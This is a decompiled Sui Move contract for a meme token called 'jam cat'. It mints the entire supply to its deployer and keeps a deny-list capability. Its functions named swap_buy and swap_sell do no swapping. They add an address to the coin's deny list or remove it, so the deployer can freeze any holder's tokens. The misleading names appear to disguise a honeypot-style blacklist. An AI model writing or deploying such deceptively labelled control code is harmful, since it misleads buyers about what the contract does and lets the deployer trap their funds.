module 0xe1c4e8beca54c8aba1f3315bfcdce5da61aa1fcc1f4d882423c2c808a5d7be12::jam {
    struct JAM has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: JAM, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<JAM>(arg0, 9, b"jam", b"jam cat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmYAH1wBwBXeJnKRkmxzAuWM5Lws8gZJgmR2q3EsDncn9e"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<JAM>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<JAM>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<JAM>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<JAM>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JAM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<JAM>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<JAM>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<JAM>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

